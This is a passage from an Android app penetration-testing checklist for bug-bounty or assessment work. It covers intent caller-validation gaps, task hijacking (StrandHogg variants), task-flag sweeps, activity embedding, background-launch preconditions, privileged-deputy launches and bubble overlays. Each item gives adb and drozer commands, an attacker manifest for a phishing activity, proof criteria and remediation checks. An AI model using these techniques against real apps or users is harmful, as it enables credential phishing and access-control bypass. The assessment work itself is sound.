  `onCreate`, including the session and ownership check — verified by re-driving with another user's
  identifier and observing a `403` from the backend or a refusal on the client.

### D04-029 · Caller validated in `onCreate` but not in `onNewIntent` (`ComponentCaller`, API 35)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15 / API 35+ for the API; the `onNewIntent` gap itself is universal |
| **Maps to** | `about/versions/15/features` (`ComponentCaller`, `Context.checkContentUriPermissionFull()`); `risks/intent-redirection` |

- **Test:** Android 15 finally gives activities a real caller identity. The two errors that follow it are
  checking the caller only in `onCreate` — so a `singleTop`/`singleTask` re-delivery from a *different*
  package is unchecked — and checking `getCallingActivity()` for non-null instead (D04-026).
- **How:**
  ```bash
  grep -rnE 'ComponentCaller|getCurrentCaller|getInitialCaller|checkContentUriPermissionFull|onNewIntent' out/sources/
  ```
  Deliver the first intent from package A (or the app's own flow) and the second from package B, then watch
  the privileged action run:
  ```bash
  adb shell am start -n com.target.app/.Target --es op view
  adb shell am start -n com.target.app/.Target --es op delete_account   # second caller, unchecked
  ```
- **Proof:** The privileged action executing on the second delivery, with the target's own logcat showing the
  caller check ran only once. A Frida hook on the validation method printing a single invocation is the
  machine-readable version.
- **Escalation:** -> D08. This is an authorisation bypass on re-delivery, and it re-opens components you
  ruled out from a single-shot test.
- **Ruled out when:** The activity overrides `onNewIntent(Intent, ComponentCaller)` (or re-checks the caller
  inside `onNewIntent`) and applies the same authorisation decision as `onCreate` — verified by the two-caller
  test above producing a refusal on the second delivery.

### D04-030 · `FLAG_ACTIVITY_NEW_TASK` plus matching affinity resurfaces a mid-flow authenticated task

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `guide/components/activities/tasks-and-back-stack` ("if a task exists with the same affinity, the system brings it to the foreground and restores state"); `content/Intent.java` flag constants |

- **Test:** With `FLAG_ACTIVITY_NEW_TASK`, an existing task with the same affinity is **brought to the
  foreground with its state restored** rather than a fresh instance being started. An attacker can therefore
  surface a victim task that is mid-flow — a payment confirmation that has already been authenticated —
  rather than starting at the login screen.
- **How:**
  ```bash
  adb shell am start -n com.target.app/.Target -f 0x10000000     # NEW_TASK
  adb shell am start -n com.target.app/.Target -f 0x10008000     # NEW_TASK|CLEAR_TOP
  adb shell am start -n com.target.app/.Target -f 0x18000000     # NEW_TASK|MULTIPLE_TASK
  adb shell dumpsys activity activities | sed -n '/Task{/,+8p'
  ```
- **Proof:** `dumpsys activity activities` showing the pre-existing task brought to front with its stack
  intact, and the on-screen state being a mid-flow authenticated screen that the attacker did not have to
  authenticate to reach.
- **Escalation:** This is the setup half of a tapjacking chain — pair with D04-048 so the resurfaced
  confirmation is completed by an overlay, and with D04-038 for the BAL precondition on API 34+.
- **Ruled out when:** The app re-runs its session/step-up check in `onResume` of the confirmation screen, or
  the confirmation is a `singleInstance` activity that finishes on task reset (`android:finishOnTaskLaunch` /
  `android:clearTaskOnLaunch`) — verified by backgrounding mid-flow, firing the flag, and observing the
  auth prompt.

### D04-031 · Task-manipulation flag sweep — the full `FLAG_ACTIVITY_*` grammar against every exported activity

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer flag map verified in `src/drozer/android.py`; MASTG-TOOL-0015 |

- **Test:** Run the exported set once more under each task flag. This is how you learn whether a third party
  can manipulate the app's task stack at all — the precondition for every UI-redress item below — without
  building an attacker app first.
- **How:** The verified name→value map:
  `ACTIVITY_BROUGHT_TO_FRONT 0x00400000`, `ACTIVITY_CLEAR_TASK 0x00008000`, `ACTIVITY_CLEAR_TOP 0x04000000`,
  `ACTIVITY_CLEAR_WHEN_TASK_RESET 0x00080000`, `ACTIVITY_EXCLUDE_FROM_RECENTS 0x00800000`,
  `ACTIVITY_FORWARD_RESULT 0x02000000`, `ACTIVITY_LAUNCHED_FROM_HISTORY 0x00100000`,
  `ACTIVITY_MULTIPLE_TASK 0x08000000`, `ACTIVITY_NEW_TASK 0x10000000`, `ACTIVITY_NO_ANIMATION 0x00010000`,
  `ACTIVITY_NO_HISTORY 0x40000000`, `ACTIVITY_NO_USER_ACTION 0x00040000`,
  `ACTIVITY_PREVIOUS_IS_TOP 0x01000000`, `ACTIVITY_REORDER_TO_FRONT 0x00020000`,
  `ACTIVITY_RESET_TASK_IF_NEEDED 0x00200000`, `ACTIVITY_SINGLE_TOP 0x20000000`,
  `ACTIVITY_TASK_ON_HOME 0x00004000`, `GRANT_READ_URI_PERMISSION 0x00000001`,
  `GRANT_WRITE_URI_PERMISSION 0x00000002`.
  ```
  dz> run app.activity.start --component com.target.app com.target.app.LoginActivity \
        --flags ACTIVITY_NEW_TASK ACTIVITY_CLEAR_TASK
  dz> run app.activity.start --component com.target.app com.target.app.LoginActivity \
        --flags ACTIVITY_NEW_TASK ACTIVITY_MULTIPLE_TASK
  ```
  ```bash
  adb shell am start -n com.target.app/.LoginActivity --activity-clear-task --activity-new-task
  adb shell am start -n com.target.app/.LoginActivity -f 0x00020000   # REORDER_TO_FRONT
  adb shell dumpsys activity activities | grep -A5 'Task{'
  ```
- **Proof:** A table of flag → resulting task composition from `dumpsys activity activities`. The target's
  login screen appearing inside a task you control, or the target's own task cleared and replaced, is the
  observable that matters.
- **Escalation:** A credential-entry screen that can be placed inside an attacker-controlled task is the
  UI-redress primitive for D04-032 through D04-040; a `GRANT_*_URI_PERMISSION` flag that survives is
  D04-023.
- **Ruled out when:** Every sensitive activity is `launchMode="singleInstance"` with `taskAffinity=""`, so
  no externally-supplied flag changes the stack — verified by the flag table showing an unchanged
  `Task{}` composition across all nineteen flags.

### D04-032 · Task hijacking via inherited `taskAffinity` + `allowTaskReparenting` (StrandHogg v1)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | no dedicated path. File as `broken_access_control.exposed_sensitive_android_intent` (null) when an exported component is the pivot, or `server_side_injection.content_spoofing.external_authentication_injection` (P4) if the triager insists on spoofing framing — argue up with the captured credential |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** Live only where `minSdkVersion` still admits devices below API 30. `risks/strandhogg` states both variants are patched at OS level in Android 11+ (v1 March 2019, v2 September 2020) and recommends `minSdkVersion=30` |
| **Maps to** | `risks/strandhogg` (MASVS-PLATFORM); MobSF `task_affinity_set`; QARK `qark/plugins/generic/task_affinity.py` and `manifest/task_reparenting.py`; sec-88 "Task Hijacking" (victim+attacker PoC, `github.com/az0mb13/Task_Hijacking_Strandhogg`); H1 #1325649; ATT&CK T1417.002, T1655.001 |

- **Test:** Every activity inherits `taskAffinity` equal to the application package name unless the developer
  sets `android:taskAffinity=""`. A malicious app declaring the victim's package as its own affinity, with
  `allowTaskReparenting="true"`, has its activity reparented into the victim's task, so the user's next tap
  on the victim's launcher icon lands on the attacker's screen — inside the victim's task, under the victim's
  Recents entry.
- **How:** Read the victim's exposure first, and read `minSdkVersion` before you spend any time here:
  ```bash
  aapt dump badging base.apk | grep -oE "(min|target)SdkVersion:'[0-9]+'"
  grep -nE 'android:(taskAffinity|allowTaskReparenting|launchMode)' out/AndroidManifest.xml
  apkanalyzer manifest print base.apk | grep -i taskaffinity
  ```
  Attacker manifest:
  ```xml
  <activity android:name=".Phish"
            android:taskAffinity="com.target.app"
            android:allowTaskReparenting="true"
            android:excludeFromRecents="true"
            android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.MAIN"/>
      <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
  </activity>
  ```
  Default-affinity variant (no `singleTask`): same affinity, and the attacker activity calls
  `moveTaskToBack(true)` in `onCreate` so the task stays in Recents but out of sight, re-asserting its view
  in `onResume`.
  ```bash
  adb shell dumpsys activity activities | sed -n '/Task{/,/mResumedActivity/p' | grep -iE 'affinity|realActivity'
  ```
- **Proof:** `dumpsys activity activities` showing the attacker activity resident inside the task whose root
  affinity equals `com.target.app`, plus a screen recording of the user tapping the *legitimate* launcher
  icon and landing on the attacker's login form. This is a visual finding — the recording is the report.
- **Escalation:** Captured credentials -> D13 account takeover; the same surface hosts a fake consent screen
  for a D03 permission grant. Behaviour varies by OEM launcher — reproduce on at least two devices and state
  both.
- **Ruled out when:** `android:taskAffinity=""` is set at `<application>` level (or on every sensitive
  activity), **or** `minSdkVersion >= 30` so no in-scope device is affected. Record the `minSdkVersion` value
  in the negative; "did not reproduce on my API 34 test device" is not a negative on its own, because the
  question is which devices the app still supports.

### D04-033 · `launchMode="singleTask"` on the launcher activity with `targetSdk < 28` (the MobSF `task_hijacking` rule)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | as D04-032 |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** MobSF's condition is `target_sdk < ANDROID_9_0_LEVEL and launchmode == 'singleTask'` |
| **Maps to** | MobSF `task_hijacking` (level `high`); MobSF `task_hijacking2` (condition `target_sdk < 29` AND `exported="true"` AND (`launchMode != "singleInstance"` OR `taskAffinity != ""`), remediation string: set `launchMode="singleInstance"` **and** `taskAffinity=""`, or raise targetSdk to 29+); sec-88 vulnerable pattern `<activity android:name=".MainActivity" android:launchMode="singleTask">` on LAUNCHER |

- **Test:** The specific manifest shape scanners flag, and the one clients will ask you about. With
  `singleTask` the activity becomes the root of its task, so a malicious app can place its own activity on
  top of that task and the user sees no app switch.
- **How:**
  ```bash
  grep -nE 'launchMode="single(Task|Instance)"' out/AndroidManifest.xml
  aapt dump badging base.apk | grep targetSdkVersion
  python3 - <<'PY'
  import xml.dom.minidom as m
  d = m.parse('out/AndroidManifest.xml'); NS='android'
  for a in d.getElementsByTagName('activity'):
      e  = a.getAttribute(f'{NS}:exported')
      lm = a.getAttribute(f'{NS}:launchMode')
      ta = a.getAttribute(f'{NS}:taskAffinity')
      if e == 'true' and (lm != 'singleInstance' or ta != ''):
          print('STRANDHOGG2-CANDIDATE', a.getAttribute(f'{NS}:name'),
                'launchMode=', lm, 'taskAffinity=', repr(ta))
  PY
  ```
  Quick probe without building an attacker app:
  ```bash
  adb shell am start -n com.target.app/.LoginActivity -f 0x10000000
  adb shell dumpsys activity activities | sed -n '/Task{/,/Run #0/p'
  ```
- **Proof:** The candidate list, plus a reproduction as in D04-032. Report the two halves separately: the
  manifest condition is the *configuration* finding; the video is the *impact* finding.
- **Escalation:** Merge this with D04-032 into one report rather than filing the scanner condition alone — a
  bare MobSF row is a P5 configuration note.
- **Ruled out when:** `targetSdkVersion >= 29` and the launcher activity is not `singleTask`, or the
  application sets `taskAffinity=""` with `launchMode="singleInstance"` on the launcher. Prove it with the
  candidate script returning no rows.

### D04-034 · StrandHogg 2.0 — reflective task hijack that ignores `taskAffinity` (CVE-2020-0096)

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | as D04-032 |
| **Attacker** | AM-03 |
| **Applies to** | **LEGACY.** Android 8.0 / 8.1 / 9 below the May 2020 security patch level; Android 10 and later are not affected. sec-88 states the exposure floor as API < 29 |
| **Maps to** | CVE-2020-0096 (`nvd.nist.gov/vuln/detail/CVE-2020-0096`), described in the corpus as "StrandHogg 2.0"; HackTricks `android-task-hijacking.md`; Promon write-up |

- **Test:** A zero-permission app iterates running tasks and uses `Context.startActivities()` and hidden APIs
  to re-parent its own activity to the top of *any* task at runtime. It needs **no manifest declaration** on
  the attacker side, which is why `taskAffinity`-based static detection misses it entirely and why a clean
  manifest is not proof of safety.
- **How:**
  ```bash
  aapt dump badging base.apk | grep -oE "minSdkVersion:'[0-9]+'"
  adb shell getprop ro.build.version.security_patch      # fix back-ported in the May 2020 SPL
  adb shell dumpsys activity activities | grep -E 'Task\{|realActivity|affinity'
  ```
  Look for an activity whose package differs from the task's affinity. Reproduce on an emulator at the lowest
  in-scope API level with a `startActivities()`-chain PoC.
- **Proof:** The attacker activity interposed into the victim's task with **no** `taskAffinity` declaration
  in the attacker manifest, on a device below the May-2020 patch level — demonstrating that the standard
  remediation advice (`taskAffinity=""`) does not cover this variant.
- **Escalation:** Same phishing impact as v1 with weaker detectability. The only app-side mitigation the
  client can take is raising `minSdkVersion`; the runtime self-defence worth recommending is periodically
  validating the top activity's package via `ActivityManager#getRunningTasks`.
- **Ruled out when:** `minSdkVersion >= 29`, or the supported fleet is entirely at or above the May 2020
  SPL — record `ro.build.version.security_patch` from the devices in scope. Static manifest review can never
  rule this out; say so explicitly rather than implying the manifest was clean.

### D04-035 · `android:allowCrossUidActivitySwitchFromBelow` not set to `false` — the modern task-hijack opt-in was not taken

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ for the defence; the docs place full enforcement at API 37+, so on Android 15/16 this is an opt-in the app must have taken |
| **Maps to** | `guide/components/activities/background-starts` (Rule 1 / Rule 2, `android:allowCrossUidActivitySwitchFromBelow`, `setAllowCrossUidActivitySwitchFromBelow(true)` as a per-activity exception); `risks/strandhogg` |

- **Test:** Android 15 added an opt-in defence: with
  `android:allowCrossUidActivitySwitchFromBelow="false"` on `<application>`, activities inside a task may
  only be launched by activities sharing the UID of the current top activity, and only same-UID foreground
  activities can bring a task forward. An app that has not set it remains hijackable in the classic same-task
  pattern on current devices — which is what makes this the *live* version of the StrandHogg family rather
  than the legacy one.
- **How:**
  ```bash
  grep -n 'allowCrossUidActivitySwitchFromBelow' out/AndroidManifest.xml   # expect false; absence = unhardened
  grep -nE 'taskAffinity|launchMode="singleTask"|allowTaskReparenting' out/AndroidManifest.xml
  adb shell dumpsys activity activities | grep -A3 'Task{.*com.target.app'
  ```
  Then run the D04-032 attacker manifest against an Android 15 device.
- **Proof:** `dumpsys activity activities` showing the attacker activity resident in the target's task on an
  Android 15 device, with the attribute absent from the target's manifest; and Back or the launcher icon
  landing on the attacker UI.
- **Escalation:** -> D13 credential capture. This is the item to lead with when the client asks "is
  StrandHogg still a thing on modern Android" — the answer is that it is, for apps that have not opted in.
- **Ruled out when:** `<application android:allowCrossUidActivitySwitchFromBelow="false">` is present with no
  per-activity `setAllowCrossUidActivitySwitchFromBelow(true)` override (D04-036), verified by the same-task
  reproduction failing on an Android 15 device.

### D04-036 · `setAllowCrossUidActivitySwitchFromBelow(true)` called at runtime — a self-inflicted hardening opt-out

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15+ |
| **Maps to** | `guide/components/activities/background-starts` |

- **Test:** Even when the manifest sets `false`, an individual activity can re-open itself by calling
  `setAllowCrossUidActivitySwitchFromBelow(true)` in `onCreate()`. Each call site is an exception the app
  carved into its own defence; the ones that matter sit on authentication and payment screens.
- **How:**
  ```bash
  grep -rn 'setAllowCrossUidActivitySwitchFromBelow' out/sources/
  # cross-reference the call sites against the sensitive-screen list
  ```
- **Proof:** The call present in an activity that also handles authentication, payment confirmation or
  account linking — and the D04-035 reproduction succeeding against *that* activity while failing against its
  siblings. The differential is the evidence.
- **Escalation:** as D04-035.
- **Ruled out when:** No call site exists, or every call site is on a screen with no credential entry and no
  irreversible control — and the D04-035 reproduction fails there too.

### D04-037 · `android:allowEmbedded` without `knownActivityEmbeddingCerts`

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all; `android:allowEmbedded` defaults to `"false"` |
| **Maps to** | `guide/topics/manifest/activity-element` (`allowEmbedded`, `knownActivityEmbeddingCerts`) |

- **Test:** `android:allowEmbedded="true"` lets an activity be launched as an embedded child of another
  activity — rendered inside a host app's window. On a sensitive activity with no
  `android:knownActivityEmbeddingCerts` pinning the permitted host signature, an untrusted host embeds and
  frames it, with whatever chrome it likes around the victim's screen.
- **How:**
  ```bash
  grep -nE 'allowEmbedded|knownActivityEmbeddingCerts|resizeableActivity' out/AndroidManifest.xml
  ```
  Then embed it from a stub host and capture the composed UI.
- **Proof:** A sensitive (auth/payment) activity declaring `android:allowEmbedded="true"` with no
  `knownActivityEmbeddingCerts`, plus a screenshot of it rendering inside your host's window with your chrome
  around it.
- **Escalation:** This is UI redress with a legitimate-looking frame, and it does not require
  `SYSTEM_ALERT_WINDOW` — so it survives the Android 12 overlay restrictions that kill D04-047. Chain to
  D13 credential capture.
- **Ruled out when:** No activity sets `allowEmbedded="true"`, or every one that does also sets
  `knownActivityEmbeddingCerts` pinning the first-party signing certificate — verified by attempting the
  embed from a differently-signed host and observing it refused.

### D04-038 · Background-Activity-Launch is the make-or-break precondition — state it or the PoC is not reproducible

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | governs every redirected- or background-launch PoC in this chapter |
| **Attacker** | AM-03 |
| **Applies to** | **CURRENT** — decisive at API 34+; weaker below, so state the API level you tested |
| **Maps to** | `about/versions/14/behavior-changes-14`; `about/versions/15/behavior-changes-15` ("PendingIntent creators block background activity launches by default"; "prevent launching arbitrary activities from other apps into your own task"); `guide/components/activities/background-starts` |

- **Test:** On API 34+ the victim app can only launch your redirected Intent **while it has a visible
  window** (`BAL_ALLOW_VISIBLE_WINDOW`). If your attacker app is foreground when the trigger lands, the
  victim is backgrounded and you get `BAL_BLOCK` with result code `102` and nothing happens. Half the
  "not reproducible" closes on this domain are this, not a broken bug.
- **How:**
  ```bash
  adb logcat -c
  # fire the chain, then:
  adb logcat | grep -oE 'BAL_[A-Z_]+'
  adb shell am start -n com.target.app/.Target ; echo "result=$?"
  ```
  The working shape observed in the field: the attacker's `onCreate` calls `moveTaskToBack(true)` at roughly
  400 ms **and** sprays the trigger about twenty times over ~24 s so one lands while the victim is visible.
  `moveTaskToBack` returns to the task *behind* the attacker, so the attacker must be opened **over the
  victim's screen** — launching it from the launcher puts the launcher behind, the victim stays hidden, and
  you get `BAL_BLOCK` every time.
  Also grep the target for the opt-back-in:
  ```bash
  grep -rnE 'setPendingIntentBackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_ALLOWED|BIND_ALLOW_ACTIVITY_STARTS|setPendingIntentCreatorBackgroundActivityStartMode' out/sources/
  ```
- **Proof:** `BAL_ALLOW_VISIBLE_WINDOW` in logcat alongside the redirected activity appearing, contrasted
  with `BAL_BLOCK` / `result code=102` when the attacker is foreground. Both captures belong in the report.
- **Escalation:** Frame the exploit as "captures on the victim's next login" — a recurring natural event —
  never as "works unconditionally". A target that calls
  `ActivityOptions.setPendingIntentBackgroundActivityStartMode(MODE_BACKGROUND_ACTIVITY_START_ALLOWED)` on a
  PendingIntent handed to third parties, or `bindService()` with `BIND_ALLOW_ACTIVITY_STARTS` exposed to an
  untrusted binder client, has re-enabled the phishing substrate on modern devices — that is a Medium-to-High
  finding in its own right (-> D08).
- **Ruled out when:** Your chain produces `BAL_BLOCK` on every attempt across at least twenty sprayed
  triggers with the attacker backgrounded, on the lowest in-scope API level as well as the highest. That is a
  real negative and it belongs in the ruled-out register with the logcat.

### D04-039 · Non-exported activity started through a system deputy (LaunchAnyWhere)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the reached screen is post-auth |
| **Attacker** | AM-03 |
| **Applies to** | all; mitigated for *implicit* intents at targetSdk 34+, but nested-**explicit** redirection is unaffected |
| **Maps to** | Oversecured, "Discovering vendor-specific vulnerabilities in Android" — the `com.android.settings.homepage.SettingsHomepageActivity` case, "since Settings runs with UID 1000 (system), this escalated to accessing non-exported activities across all apps on the device"; AOSP threat classes [T.A2] and [T.A7] |

- **Test:** A privileged app — Settings, a vendor launcher, an account-authenticator host — that takes an
  `Intent` or `Bundle` from an untrusted caller and `startActivity()`s it becomes a launcher for
  **non-exported** activities anywhere on the device, executed with the deputy's UID. This re-opens every
  activity you ruled out as `exported="false"`.
- **How:**
  ```bash
  adb shell dumpsys package com.android.settings | grep -E 'exported=true' | head -40
  # jadx on the deputy: nested-Intent extraction into startActivity
  grep -rnE 'getParcelableExtra\([^)]*\)\s*;?\s*$|startActivity\(\s*\(Intent\)' deputy_src/
  adb shell am start -n com.oem.settings/.homepage.SettingsHomepageActivity \
    -e ':android:show_fragment' com.target.app.InternalFragment
  ```
  ```java
  // nested-Intent deputy, from an attacker app
  Intent inner = new Intent();
  inner.setClassName("com.target.app", "com.target.app.internal.NonExportedActivity");
  Intent outer = new Intent("com.oem.ACTION");
  outer.putExtra("intent", inner);
  startActivity(outer);
  ```
- **Proof:** The non-exported activity visibly starting, named by
  `adb shell dumpsys activity activities | grep -A3 mResumedActivity`, while a direct
  `am start -n com.target.app/.internal.NonExportedActivity` from the same context returns
  `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`. That contrast — direct
  start denied, deputy-mediated start succeeded — is the whole finding.
- **Escalation:** Non-exported activities skip auth precisely because they assume an internal caller, so the
  reached screen is usually a D04-007 or a D04-013 -> D15. Critical when the deputy runs as UID 1000, because
  the started component inherits system-side effects.
- **Ruled out when:** No deputy on the device forwards a caller-supplied Intent (verified by reading the
  candidate deputies' handlers, not by a scanner), **and** the target's non-exported activities refuse to run
  without the session state the normal flow establishes. On a stock Google device with no OEM Settings fork,
  record that the deputy set was empty — that is scoped, not universal.

### D04-040 · Bubble activity — `allowEmbedded` + `documentLaunchMode="always"` is a permission-free float-over-other-apps surface

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) if it renders another user's conversation |
| **Attacker** | AM-03 |
| **Applies to** | API 29+ for bubbles; API 30+ requires a long-lived sharing shortcut |
| **Maps to** | `develop/ui/views/notifications/bubbles` — `NotificationCompat.BubbleMetadata.Builder`, `setAutoExpandBubble(true)`, `setSuppressNotification(true)`, `setShortcutId()`, `android:allowEmbedded="true"`, `android:resizeableActivity="true"`, `android:documentLaunchMode="always"`, and "Bubbles float on top of other app content" |

- **Test:** Chat and support features that implement Android Bubbles must declare the bubble target with
  `allowEmbedded="true"`, `resizeableActivity="true"` and (API 29 and lower) `documentLaunchMode="always"`.
  That activity renders **over other apps with no overlay permission**. Two questions: is it also exported or
  reachable through a leaked `PendingIntent`, and does it render conversation content without re-checking the
  session?
- **How:**
  ```bash
  grep -nE 'allowEmbedded="true"' out/AndroidManifest.xml
  grep -rnE 'BubbleMetadata|setBubbleMetadata|setAutoExpandBubble|setSuppressNotification|setShortcutId' out/sources/
  adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId 'victim-thread-id'
  adb shell am force-stop com.target.app && \
    adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId X
  ```
- **Proof:** The bubble activity drawing a conversation you do not own, or drawing at all after
  `am force-stop` with no login prompt — screen-recorded floating over a third-party app.
- **Escalation:** `setAutoExpandBubble(true)` plus `setSuppressNotification(true)` is a **silent overlay
  primitive obtained without `SYSTEM_ALERT_WINDOW`** — chain it to D04-047/-048 against a consent screen, or
  to D13 credential capture. This is the overlay route that the Android 12 untrusted-touch block does not
  address.
- **Ruled out when:** The app declares no bubble metadata, or the bubble target is `exported="false"` and its
  `onCreate` resolves the conversation from the session rather than the extra — verified by supplying another
  account's conversation id and observing an empty or refused view.

